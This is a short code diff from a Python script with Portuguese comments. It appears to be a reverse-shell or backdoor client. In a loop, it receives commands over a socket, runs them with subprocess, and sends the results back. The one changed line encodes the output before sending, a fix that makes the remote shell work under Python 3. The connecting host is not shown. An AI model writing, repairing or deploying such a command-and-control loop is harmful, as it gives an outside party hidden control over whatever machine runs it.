@@ -23,7 +23,7 @@ while True:
     if command.lower().startswith("cd"):
         subprocess.getoutput(command)
         output = subprocess.getoutput("cd")
-        s.send(output)
+        s.send(output.encode())
     # Executar o comando
     output = subprocess.getoutput(command)
     # Enviar o resultado
